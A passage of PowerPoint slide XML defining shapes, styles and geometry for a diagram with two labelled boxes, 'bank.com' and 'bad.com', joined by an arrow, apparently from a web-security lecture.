          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161800" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161801" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2176145"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T5" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2176145"/>
              <a:gd name="T7" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2176145"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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76145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161803" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161804" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161806" name="object 14"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161807" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161808" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
